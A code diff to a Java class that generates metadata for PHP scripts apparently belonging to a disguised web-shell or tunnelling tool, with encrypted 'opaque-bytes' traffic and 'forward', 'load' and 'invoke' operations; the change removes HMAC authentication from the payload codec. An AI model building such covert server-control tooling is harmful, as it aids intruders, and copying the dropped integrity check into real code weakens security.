@@ -63,7 +63,7 @@ public final class PhpScriptGeneratorProvider implements ScriptGeneratorProvider
         metadata.put("minimumVersion", MINIMUM_VERSION);
         metadata.put("protocols", List.of("http"));
         metadata.put("protocolVersion", DisguiseProtocol.PROTOCOL_VERSION);
-        metadata.put("payloadCodec", "php-json-gzip-aes-cbc-hmac-v1");
+        metadata.put("payloadCodec", "php-json-gzip-aes-cbc");
         metadata.put("trafficLayer", "opaque-bytes");
         metadata.put("coreProtocol", "Envelope");
         metadata.put("coreOperations", List.of("test", "forward", "load", "invoke"));
@@ -81,14 +81,14 @@ public final class PhpScriptGeneratorProvider implements ScriptGeneratorProvider
                 OUTPUT_COMPACT, Map.of("minVersion", MINIMUM_VERSION,
                         "extensions", List.of("json", "openssl", "zlib"),
                         "functions", List.of("openssl_encrypt", "openssl_decrypt", "openssl_random_pseudo_bytes",
-                                "hash_hmac", "hash_equals", "gzencode", "gzdecode")),
+                                "gzencode", "gzdecode")),
                 OUTPUT_PACKED, Map.of("minVersion", MINIMUM_VERSION,
                         "extensions", List.of("json", "openssl", "zlib"),
                         "functions", List.of("base64_decode", "gzinflate")),
                 OUTPUT_PORTABLE, Map.of("minVersion", MINIMUM_VERSION,
                         "extensions", List.of("json", "openssl", "zlib"),
                         "functions", List.of("openssl_encrypt", "openssl_decrypt", "openssl_random_pseudo_bytes",
-                                "hash_hmac", "hash_equals", "gzencode", "gzdecode"))));
+                                "gzencode", "gzdecode"))));
         return metadata;
     }
 
@@ -148,7 +148,8 @@ public final class PhpScriptGeneratorProvider implements ScriptGeneratorProvider
             case OUTPUT_PORTABLE -> expandedSource;
             default -> compactSource;
         };
-        Map<String, Object> requirements = runtimeRequirements(requestDisguise, responseDisguise, outputMode);
+        Map<String, Object> requirements = runtimeRequirements(requestDisguise, responseDisguise,
+                outputMode, headerName != null);
 
         Map<String, Object> metadata = new LinkedHashMap<>();
         metadata.put("runtime", "php");
@@ -156,7 +157,7 @@ public final class PhpScriptGeneratorProvider implements ScriptGeneratorProvider
         metadata.put("protocol", "http");
         metadata.put("minimumVersion", requirements.get("minVersion"));
         metadata.put("protocolVersion", DisguiseProtocol.PROTOCOL_VERSION);
-        metadata.put("payloadCodec", "php-json-gzip-aes-cbc-hmac-v1");
+        metadata.put("payloadCodec", "php-json-gzip-aes-cbc");
         metadata.put("trafficLayer", "opaque-bytes");
         metadata.put("coreProtocol", "Envelope");
         metadata.put("coreOperations", List.of("test", "forward", "load", "invoke"));
@@ -209,7 +210,7 @@ public final class PhpScriptGeneratorProvider implements ScriptGeneratorProvider
     }
 
     private Map<String, Object> runtimeRequirements(Disguise requestDisguise, Disguise responseDisguise,
-                                                     String outputMode) {
+                                                     String outputMode, boolean headerGuardEnabled) {
         Map<String, Object> requirements = new LinkedHashMap<>();
         Set<String> extensions = new LinkedHashSet<>();
         Set<String> functions = new LinkedHashSet<>();
@@ -229,10 +230,9 @@ public final class PhpScriptGeneratorProvider implements ScriptGeneratorProvider
         functions.add("openssl_encrypt");
         functions.add("openssl_decrypt");
         functions.add("openssl_random_pseudo_bytes");
-        functions.add("hash_hmac");
-        functions.add("hash_equals");
         functions.add("gzencode");
         functions.add("gzdecode");
+        if (headerGuardEnabled) functions.add("hash_equals");
         if (!extensions.isEmpty()) requirements.put("extensions", extensions.stream().sorted().toList());
         if (!functions.isEmpty()) requirements.put("functions", functions.stream().sorted().toList());
         return requirements;
